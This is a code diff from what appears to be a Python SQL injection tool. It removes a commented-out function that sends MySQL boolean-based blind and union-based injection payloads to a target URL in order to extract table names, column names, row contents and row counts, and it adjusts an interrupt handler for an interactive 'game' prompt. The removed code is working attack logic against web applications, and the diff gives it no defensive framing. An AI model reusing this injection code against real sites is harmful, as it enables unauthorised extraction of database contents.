@@ -22,81 +22,6 @@ import core.config as cfg
 
 #special_chars = "_.@-:;[](){}/|!#$%^&*=+~" # TODO: add letter counter in words to fix endless spaces at the end
 
-#async def send_payload(mode, table, column, offset, position, num, char, session, operator='='):
-#    #print(f"mode={mode}, table={table}, column={column}, offset={offset}, position={position}, nums={nums}, char={char}, session={session}")
-#    payload_table_name = table_name_payloads_boolen_based_blind["MySQL"][0].format(position=position, offset=offset, operator=operator, char=char)
-#    payload_column_name = column_name_payloads_boolen_based_blind["MySQL"][0].format(position=position, table=table, offset=offset, operator=operator, char=char)
-#    payload_entity_name = entity_name_payloads_boolen_based_blind["MySQL"][0].format(column=column, position=position, table=table, offset=offset, operator=operator, char=char)
-#    payload_entity_count = entity_count_payloads_boolen_based_blind["MySQL"][0].format(column=column, table=table, operator=operator, num=num)
-#    payload_table_name_union_based = table_name_payloads_union_based["MySQL"][0].format(offset=offset)
-#    payload_column_name_union_based = column_name_payloads_union_based["MySQL"][0].format(table=table, offset=offset)
-#    payload_entity_name_union_based = entity_name_payloads_union_based["MySQL"][0].format(column=column, table=table, offset=offset)
-#
-#    if mode == 'entity-test':
-#        async with session.get(usr_url+payload_entity_name_union_based, allow_redirects=True) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload: None")
-#            sys.stdout.flush()
-#
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] entity name: | offset [{offset}] || {response.status}")
-#            return response.url
-#
-#    elif mode == 'column-test':
-#        async with session.get(usr_url+payload_column_name_union_based, allow_redirects=True) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload: None")
-#            sys.stdout.flush()
-#
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] column name: | offset [{offset}]")
-#            return response.url
-#    elif mode == 'table-test':
-#        async with session.get(usr_url+payload_table_name_union_based, allow_redirects=True) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload: None")
-#            sys.stdout.flush()
-#    
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] table name: | offset [{offset}]")
-#            return response.url
-#    elif mode == 'table':
-#        async with session.get(usr_url+payload_table_name, allow_redirects=False) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload[{position}]: {operator}'{char}' || {usr_url}{payload_table_name}")
-#            sys.stdout.flush()
-#
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] table name: {general_name} | offset [{offset}]")
-#            return response.status == true_code
-#    elif mode == 'column':
-#        async with session.get(usr_url+payload_column_name, allow_redirects=False) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload[{position}]: {operator}'{char}' || {usr_url}{payload_column_name}")
-#            sys.stdout.flush()
-#
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] column name: {general_name} | offset [{offset}]")
-#            return response.status == true_code
-#    elif mode == 'entity':
-#        async with session.get(usr_url+payload_entity_name, allow_redirects=False) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload[{position}]: {char} || {usr_url}{payload_entity_name}")
-#            sys.stdout.flush()
-#    
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] entity name: {general_name} | offset [{offset}]")
-#            return response.status == true_code
-#    elif mode == 'entity-count':
-#        async with session.get(usr_url+payload_entity_count, allow_redirects=False) as response:
-#            sys.stdout.write("\033[s\n")
-#            print(f"[*] payload: {num}")
-#            sys.stdout.flush()
-#    
-#            sys.stdout.write("\033[u")
-#            sys.stdout.write(f"\033[2K\r[+] entity count: {entity_counter} | offset [{offset}]")
-#            return response.status == true_code
-
 
 #async def binary_search(offset, position, nums, chars, session):
 async def binary_search(session, data):
@@ -216,8 +141,8 @@ async def main():
                                 general_name = ""
                                 #break
             
-                #except KeyboardInterrupt:
-                except:
+                except KeyboardInterrupt:
+                #except:
                     print("\n[!] Player paused the game...\r")
                     usr_abort = input("\n[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
                     if usr_abort == "e":
